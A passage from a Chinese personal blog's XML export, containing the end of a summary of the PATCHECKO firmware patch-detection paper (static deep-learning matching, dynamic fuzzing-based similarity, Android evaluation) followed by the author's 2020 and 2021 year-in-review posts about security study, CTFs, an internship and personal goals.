图3展示了一个用于深度学习模型的样本向量。样本向量由函数向量对和一个表示两个函数是否相似的比特组成，其中两个相似的特征向量对应着相同源代码的两个二进制函数。图4是该6层序列模型训练的实际过程，第一层接收输入张量的形状（input shape）的信息。这个模型使用了从数据集中提取的函数特征进行训练。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210918220859.png" alt="fig-3"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210917223725.png" alt="fig-4"></p>
<h2 id="0x2-动态分析">0x2 动态分析</h2>
<p>动态分析的工作流程如图5：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210918220751.png" alt="fig-5"></p>
<p>该阶段使用相同的输入值执行两个函数，并比较两个函数的执行轨迹和其他特征的相似性。</p>
<h3 id="Ⅰ-动态分析引擎的输入数据">Ⅰ 动态分析引擎的输入数据</h3>
<p>作者使用Fuzz工具（在评估过程中选用了LibFuzzer）生成函数的多组输入数据，以完全覆盖CFG，并测试证明这些数据都能正常运行于漏洞函数和已修复漏洞的函数。接着使用这些数据来测试每个候选函数，筛去执行过程中崩溃的函数。<br>
随后PATCHECKO将剩下函数作为可执行文件导出，在后续动态分析中使用DLL注入进行执行</p>
<h3 id="Ⅱ-插桩测试">Ⅱ 插桩测试</h3>
<p>作者使用了gdbserver和debugserver对函数执行进行跟踪和特征提取，提取的特征包括指令的数量和类型、系统调用的次数和类型，以及库函数调用和堆栈数据读写量等，具体在表Ⅱ中展示：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210919143257.png" alt="tab-2"></p>
<p>对于每个输入执行时，动态分析引擎会对每个特征会生成一组观察结果。当该函数里的所有指令都被覆盖到后，PATCHECKO会根据所有结果生成一个单独的向量。这个过程会在每次对函数进行不同输入时重复。</p>
<h3 id="Ⅲ-计算函数语义相似度">Ⅲ 计算函数语义相似度</h3>
<p>对于每个函数对(f,g)，PATCHECKO基于它们的动态特征向量距离计算出语义相似度。对于每个函数的特征向量，PATCHECKO使用了闵氏距离(Minkowski Distance)作为测量相似度的方法，在评估过程中，作者把p设为3。闵氏距离公式的一般式如下：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210919171915.png" alt="minkowski"><br>
在这个公式中，f代表了CVE函数，g代表目标固件中的候选函数，k指的是用到了第k个执行环境，x和y分别代表f和g的动态特征向量，此时P设为3。</p>
<p>每个函数相似度的最终结果为所有执行环境中得到相似距离的平均值，相似度计算方程如下（k为执行环境编号）：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210919180346.png" alt="sim-algorithm"></p>
<h3 id="Ⅳ-补丁检测">Ⅳ 补丁检测</h3>
<p>PATCHECKO使用了一个差分引擎来收集静态和动态相似性的检测结果，以此判断漏洞是否被修复。<br>
对于给定的漏洞函数f<sub>v</sub>、已修复函数f<sub>p</sub>和目标函数f<sub>t</sub>，差分引擎会首先生成三个值：f<sub>v</sub>、f<sub>p</sub>和f<sub>t</sub>的静态特征、sim<sub>v</sub>与sim<sub>t</sub>、sim<sub>p</sub>与sim<sub>t</sub>的动态语义相似性得分以及S<sub>v</sub>和S<sub>p</sub>之间的差分特征（differential signatures）。静态特征即上述的48个不同的量化特征，动态语义相似度得分与上述的函数相似度指标。差分特征（differential signatures）是一个用于比较CFG结构的附加指标，即两个函数的CFG拓扑以及语义信息，例如函数参数、局部变量和库函数调用。</p>
<h1>评价</h1>
<h2 id="评估结果">评估结果</h2>
<p>对于模型训练数据集，作者使用Clang从Android-8.1.0_r36的源码中编译了100个库函数，每个库根据不同的目标平台（ x86, AMD64, ARM 32bit， ARM 64bit ISA）、优化级别（O0, O1, O2,O3, Oz, Ofast）生成了23个不同的二进制文件，总共获得了2108个库文件，包含了2037772个函数特征样本。其中1222663个函数用于模型训练，407554个函数用于校验，407555个函数用于下图的测试<br>
图8展示了在训练了大约15小时后，深度学习模型的准确率和损失，其中准确率可达到96%。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030090924.png" alt="fig-8"></p>
<p>作者对Android Things 1.0 和 Google Pixel 2 XL (Android 8.0) 的固件进行了评估。所用的漏洞函数数据集来自Android Security Bulletins，包括了从2016年7月到2018年11月的漏洞，涵盖2076个漏洞。检测结果表明，模型的静态检测平均准确率高于93%</p>
<p>对于动态分析输出的漏洞函数，除了深度学习阶段就被漏报的CVE-2017-13209外，PATCHECKO能将其余所有预期的目标函数输出到结果的前三位。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030090830.png" alt="dyn-result"></p>
<p>对于函数是否已修复的检测，PATCHECKO在25个CVE漏洞函数中只遗漏了CVE-2018-9470，该CVE的漏洞函数和修复函数仅差了一个整数。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master//blog/20211030090706.png" alt="dyn-result-2"></p>
<h2 id="缺点">缺点</h2>
<ol>
<li>在静态检测时，PATCHECKO通过比较候选函数与已修复/未修复函数来检测是否为目标函数，这导致了可能会产生遗漏</li>
<li>检测漏洞是否已修复时，由于CFG表示的特征粒度不够细，可能会因为漏洞函数和已修复函数之间的差异非常微小，导致相似性检测可能无法捕捉到它们之间的差异。</li>
</ol>
<p>第二点或许可以通过应用/结合其他程序表示方法，如CDG、PDG等结构来进行优化。但如作者所说的，这样可能还需要进一步对方案通用性方面进行设计。</p>
]]></content>
  </entry>
  <entry>
    <title>2020总结以及2021的flag</title>
    <url>/3919.html</url>
    <content><![CDATA[<p>昨天00：40睡到了11：00…</p>
<span id="more"></span>
<h2 id="学习方面">学习方面</h2>
<p>课内学的好水…无论大一下的网课还是大二上在学校上的，跟考研直接相关的数据结构学的还行，概率论就比较差了。<br>
本来以为以后不会跟电路打交道，于是几节关键的数电网课就没听（后面就听不懂了），前段时间了解iot安全和计组后发现跟电路的关联还是比较大的，特别是iot的硬件方向。也许我某一天也会有点懊恼没认真听大物和离散？终究是路走窄了23333</p>
<p>实验室方向方面，算是看完了《逆向工程核心原理》《加密与解密》《程序员的自我修养》。三本书都还是处于常看常新的状态（尤其是前两本，看的时候一知半解，现在估计也忘了好多…）。<br>
今年学的还是太慢了，特别是上半年。上回在知乎上看到龙佬大二上的某个提问（学了《逆向》《加密》《python》《cppp》《0day2》）麻了。作为还能苟活在实验室而没有被踢掉的菜鸡，诚惶诚恐。<br>
ctf-wiki上学到了heap，配合别人写的guidance看了一点malloc.c源码<br>
感觉现在好像对底层的实现更有兴趣，比如bios、操作系统、编译原理、各种引擎、通信协议、汇编，which 完全不是 child dream 和去年学计算机的原因嘛23333…<br>
搭了个ctf平台用于纳新，算是用过了xshell和docker（再次大言不惭），熟悉了od和ida还有linux、vim的简单用法和命令。<br>
除了专业知识外，感觉对安全的领域和路了解太少了。</p>
<p>课外的话，在Trump和COVID-19的合作摧毁了公知和美分的谎言后，开始以其他角度，（或许更全面的）认识某些事情，有了一点政治、经济的常识（大言不惭），当然依旧羡慕Donald那种能表达为语言和文字的能力和积累。<br>
看了一点《千年金融史》（真·一点）</p>
<h2 id="其他">其他</h2>
<ul>
<li>当了个安全组组长，经历了协会纳新、小组考核、开会等，感觉有空可以开一篇记一下个中感受</li>
<li>（好像…又再次坚定要考研也是在今年哎，冲！）</li>
<li>报了三个ctf比赛（湖湘杯，X-NUCA,校赛），湖湘杯忘了参加，X-NUCA啥都不会，只会校赛。虽然校赛贼水，但也算是参加过了个ctf，算是感受了比赛的过程。</li>
<li>上半年在家的时候，在网上教一个人学c，并浪费了好多时间，后来第一次产生&quot;后悔遇到某人&quot;的愤懑</li>
<li>依然没有对哪个妹子产生过想要追的感觉，有时候觉得现在的日常安排挺充实的，为啥要多一个人出来干扰（…），毕竟连买/白嫖了的游戏都没时间玩（…)</li>
<li>入门了网球</li>
<li>过了科二，快要拿到驾照了（是没啥能写的 所以来凑数了吗）</li>
</ul>
<h2 id="Flag">Flag</h2>
<ul>
<li>看完《经济学原理》（两本）《两次全球大危机的比较研究》，（去年立的“看三本书”的flag果然没有达成，今年就更具体一点好了…）</li>
<li>背完考研单词</li>
<li>复习高数</li>
<li>看x86汇编、从龙佬那嫖来的glibc内存管理、csapp、操作系统、0day2、漏洞战争</li>
<li>打几个ctf</li>
<li>早睡（…)</li>
<li>坚持锻炼，特指开始jogging</li>
<li>去西北或东欧旅游（如果能的话…这是去年的flag了）</li>
<li>继续买基金（12月底因为懒得看，把手上的基本都卖了…</li>
</ul>
<p>over！</p>
]]></content>
      <tags>
        <tag>年度总结</tag>
      </tags>
  </entry>
  <entry>
    <title>2021总结以及2021的flag</title>
    <url>/44262.html</url>
    <content><![CDATA[<p>30晚上写一点，31晚上写一点…结果还是在1号中午才写完</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大概十二月初的时候就想着写总结了，但还是决定把它攒到最后几天来写。</span><br><span class="line">本来打算写成正经的小作文，但想说的实在挺多，太懒了也不想再重构</span><br></pre></td></tr></table></figure>
<p>要不…还是像上回一样分成几个部分来写吧</p>
<h1>学习方面</h1>
<p>课内的话依旧没啥好说的，可能缺憾是在计组、计网上花的时间不多、没认真学编译原理吧。<br>
选编译原理的时候以为讲的侧重编译器后端，结果发现主要在讲前端，就没咋认真听了。前几周看了安全客的一个专题<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3N1YmplY3QvaWQvMjUxNDI4">数学魔法——你所不了解的程序分析<i class="fa fa-external-link-alt"></i></span>，感觉还是应该好好学一下的（比如听个南大李樾老师等的程序分析课？有空一定）</p>
<p>安全方向的话，今年还干了挺多事的，打ctf，分析漏洞，水文章，看论文，实习，blablabla…<br>
寒假和大二下可能算是偏离大部分安全人ctfer的开端吧2333。原本没打算打ctf（当时还没认识变成赛棍的文兄和朱哥等师傅），打算做点Pwn题后就以复现分析漏洞的方式学习安全。在寒假和大二下学期翻完了《x86汇编》、《操作系统精髓与设计原理》、glibc内存管理，看了一点《0day2》和几章《漏洞战争》，分析了后者里栈部分的ndays（就无暇再看了）。<br>
期间出于对一些事情的uncertainty，厚着脸皮蹭了学校导师的课题组（翻记录发现第一次向老师请教原来是在20年年底，看当时的邮件内容真是略显幼稚2333）。随后参加组会、开始看论文、看文档、陆续部署和踩坑了四五个工具，顺带学了点VEX IR，把学习过程的代码和注释胡乱塞到一篇文章，后来还被一个师傅放他博客里引流了（上回打算有空把那篇整理一下，但不出意外的鸽掉了）。<br>
（因为太喜欢钱了，于是）在安全客上投了一篇综述翻译，挣到（应该是）人生第一笔稿费，投了一篇IoT固件分析的tutorial（主要是跟着做github上一个项目的过程，现在看起来超级shallow了），又恰了一笔钱…<br>
后来就是在CISCN被文兄、郭佬、刘哥等人带飞，tqltql，有一说一着实怀念整天做题的充实日子，低级做题家实锤了。但仔细想来，CTF对我而言或许只是手段（之一）而不是目的，于是就愉快退役啦…<br>
就这样到了暑假和大三上学期，几乎没学二进制方向的日子，差不多就由实习、蹭课题、看论文组成。<br>
很意外的找到了CIC的远程实习，虽然跟Pwn不是特别相关，也不是设想中的purely paper work，不过本来也打算开始学Web了 <s>（而且在学Web的时候还能打全网）</s>，而且让我看到了安全领域中更广（far more than CTF）的一些方面，在工作中也得到了一些作为protector的satisfaction，这种在real world挖洞的满足感确实跟比赛不太相似。当然的确占用了大量时间，不过也收获了很多，唯一可惜的是只能在线上实习吧。31号也结束实习了，芜湖~<br>
加入了安全客的作者群和翻译群，接了两次翻译，又翻译了一篇论文，后来在知乎上看到白泽的师傅精读论文的文章，感觉翻译论文的[投入/产出]确实不高，又尝试输出了两篇精读论文的文章，还行，也能加深自己的理解。收到了安全客送的月饼和公仔（可惜公仔寄回家了），芜湖~<br>
有一说一，安全客打稿费的周期也太长了，每次拿到钱总感觉是得到了意外之财…<br>
在蹭课题的时候依旧是参加组会、部署工具、写脚本和汇报了一次工具以及LLVM IR，虽然每次参加组会看起来基本上都没事干，但毕竟是在见识“组会”，还能从师兄师姐的汇报中学到不少软件静态分析和深度学习等的知识。所以也算是在见识bigger picture（这是在上岸前就为科研做准备吗…<br>
奥对了，十二月的时候在线上悄悄蹭了两次厦大吴荣鑫教授和信工所孟国柱教授给复旦软件工程实验室做的安全方面的报告，受益匪浅啊%%%，这也算是我觉得自己在12月做的最牛逼的事情了2333</p>
<p>今年在心态上也发生了点变化，以前总想着要去做点务实的方向，研究一些工业界real、cool的东西，今年看了点论文，发现做些务虚的研究可能更适合我，具体就不细说了（躺<br>
当然今年还有挺多遗憾的事情，例如没考雅思、没有完成去年的flag、没有开始内核安全的学习、还有几篇Fuzz相关的论文没有看完等等，年底本来打算跟着看雪上一篇Winafl的文章操作一遍，结果隔离在宿舍单屏幕工作效率太低也只做了一半（还是因为自己太菜，这算是最遗憾的了）<br>
下学期开始准备考研啥的，也不知道这些遗憾啥时候能补上</p>
<h1>其他</h1>
<ul>
<li>变成协会的老人，赖在FZ130</li>
<li>完整见识了FZ130的24小时</li>
<li>发了工资后买了人生中第一个大于一百块的耳机，真好</li>
<li>买了个垂直鼠标</li>
<li>买了一套手磨咖啡豆和做手冲咖啡的小玩意，并发现实验室饮水机里出的热水只有80+°C</li>
<li>六级只准备了两周半，并不是很理想</li>
<li>大三上恰的钱完全cover了一学期的支出</li>
<li>开始争取一点东西，拿了点证书和奖</li>
<li>能拉17个引体向上，本来打算寒假回家前做到能拉20个，这下估计不太可能了orz</li>
<li>跟朋友去西安周边玩。去了个华山因为厦门疫情没上去，去了个石泉县还蛮有意思的</li>
<li>拿了驾照</li>
<li>上半年打了好久网球，可惜下半年也就打了三五次</li>
<li>在年末的时候（正在）经历西安的疫情，关在宿舍里隔离。虽然之前在家也有居家隔离过，但确实只有只身在外才能真实体会到身处疫区的感觉，也才能再次坚定信任和佩服国家严控疫情的措施。BTW，有一说一，还好在隔离的时候有王师傅在二次元陪我。说，谢谢王师傅:D</li>
<li>要是能出门了，我第一件想做的事是去跑一千米，不过具体能跑几米跑几米吧</li>
</ul>
<h1>flag回顾</h1>
<ul>
<li>看完《经济学原理》（两本）《两次全球大危机的比较研究》<br>
<strong>额，我本来打算看的是这三本吗…看了半本《论中国》和四分之一《论人类不平等的起源和基础》</strong></li>
<li>背完考研单词<br>
<strong>哈哈</strong></li>
<li>复习高数<br>
<strong>哈哈</strong></li>
<li>看<s>x86汇编</s>、<s>从龙佬那嫖来的glibc内存管理</s>、csapp、<s>操作系统</s>、0day2、漏洞战争<br>
<strong>看完的划掉了，没看（完）的可惜了</strong></li>
<li><s>打几个ctf</s><br>
<strong>算是吧</strong></li>
<li>早睡<br>
<strong>哈哈你可真幽默</strong></li>
<li>坚持锻炼，特指开始jogging<br>
<strong>没有jogging</strong></li>
<li><s>去西北或东欧旅游</s><br>
<strong>去兰州打比赛，顺便玩了一天</strong></li>
<li><s>继续买基金</s><br>
<strong>好久没看了，刚才看了一下，我就该在8月的时候把它们卖掉的，12月初卖掉也好啊…不过反正是盈利了</strong></li>
</ul>
<h1>2022的flag</h1>
<p>不立了</p>
]]></content>
      <tags>
        <tag>年度总结</tag>
      </tags>
  </entry>
</search>
